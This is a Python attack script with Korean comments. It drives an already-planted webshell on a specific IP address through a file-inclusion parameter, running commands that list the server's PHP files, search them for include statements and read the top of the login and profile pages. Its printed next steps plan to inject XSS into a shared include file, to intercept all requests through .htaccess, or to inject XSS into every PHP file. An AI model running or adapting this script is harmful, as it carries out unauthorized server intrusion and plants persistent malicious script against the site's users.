#!/usr/bin/env python3
"""
PHP 파일 구조 확인 및 공통 include 파일 찾기
"""

import requests

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/file.php?file=shell.jpg&cmd="

def execute_cmd(cmd):
    """웹쉘을 통해 명령 실행"""
    try:
        response = requests.get(WEBSHELL + requests.utils.quote(cmd), timeout=10)
        return response.text
    except Exception as e:
        return f"Error: {e}"

print("=" * 60)
print("🔍 PHP 파일 구조 분석")
print("=" * 60)
print()

# 1. 모든 PHP 파일 찾기
print("[*] 1. 모든 PHP 파일 목록:")
print("-" * 60)
result = execute_cmd("find /var/www/html -name '*.php' -type f")
print(result)
print()

# 2. 공통 include 파일 검색
print("[*] 2. require/include 패턴 검색:")
print("-" * 60)
result = execute_cmd("grep -r 'require\\|include' /var/www/html/*.php | head -20")
print(result)
print()

# 3. 각 PHP 파일의 첫 10줄 확인
print("[*] 3. 주요 PHP 파일 상단 확인:")
print("-" * 60)

php_files = ['index.php', 'login.php', 'profile.php', 'new_post.php']
for php_file in php_files:
    print(f"\n--- {php_file} ---")
    result = execute_cmd(f"head -10 /var/www/html/{php_file}")
    print(result)

print()
print("=" * 60)
print("📝 분석 완료")
print("=" * 60)
print()
print("다음 단계:")
print("1. 공통 include 파일이 있다면 → 그 파일에 XSS 주입")
print("2. 공통 파일이 없다면 → .htaccess로 모든 요청 가로채기")
print("3. 또는 모든 PHP 파일 상단에 XSS 주입")
print()
